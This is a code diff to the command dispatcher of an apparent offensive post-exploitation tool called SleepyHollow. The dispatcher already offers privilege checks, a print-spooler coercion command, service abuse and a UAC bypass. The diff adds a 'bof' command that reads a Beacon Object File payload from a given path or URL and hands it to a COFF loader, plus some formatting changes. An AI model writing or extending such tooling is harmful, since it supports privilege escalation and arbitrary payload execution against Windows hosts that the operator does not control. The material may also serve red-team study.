@@ -1,5 +1,5 @@
 using SleepyHollow;
-using SpoolSample;
+using SleepyHollow.Bof.Types;
 
 #if !HEADLESS
 var commands = new Dictionary<string, Dictionary<string, string>>
@@ -43,6 +43,13 @@ var commands = new Dictionary<string, Dictionary<string, string>>
             { "cmd", "command to execute" },
             { "service", "service to abuse" },
             { "raw", "execute command without prepending cmd.exe /c" }
+        }
+    },
+    {
+        "bof",
+        new Dictionary<string, string>
+        {
+            { "url", "path/URL to BOF payload" },
         }
     }
 };
@@ -102,16 +109,16 @@ switch (options["command"])
 {
     case "user":
         var privileges = UserHelper.CheckPrivileges();
-        Console.WriteLine($"User: {UserHelper.GetUserName(), 43}");
-        Console.WriteLine($"IsAdmin: {UserHelper.IsAdmin(), 40}");
+        Console.WriteLine($"User: {UserHelper.GetUserName(),43}");
+        Console.WriteLine($"IsAdmin: {UserHelper.IsAdmin(),40}");
         if (!UserHelper.IsAdmin())
         {
-            Console.WriteLine($"CanElevate: {UserHelper.IsMemberOfAdministrators(), 37}");
+            Console.WriteLine($"CanElevate: {UserHelper.IsMemberOfAdministrators(),37}");
         }
         Console.WriteLine("Privileges:");
         foreach (var kvp in privileges)
         {
-            Console.WriteLine($"  {kvp.Key, -35}: {(kvp.Value ? "Enabled" : "Disabled"), 10}");
+            Console.WriteLine($"  {kvp.Key,-35}: {(kvp.Value ? "Enabled" : "Disabled"),10}");
         }
         break;
     case "spool":
@@ -174,6 +181,18 @@ switch (options["command"])
     case "uac":
         var uacCmd = options["cmd"];
         UACBypass.RunAsAdministrator(uacCmd);
+        break;
+    case "bof":
+        var bofUrl = options["url"];
+        if (debugEnabled)
+            Console.WriteLine($"Downloading BOF from {bofUrl}...");
+        var bofData = File.ReadAllBytes(bofUrl);
+        if (bofData.Length == 0)
+        {
+            Console.WriteLine("Failed to download BOF data.");
+            Environment.Exit(1);
+        }
+        var coff = new Coff(bofData);
         break;
     default:
         Console.WriteLine($"Unknown command {options["command"]}");
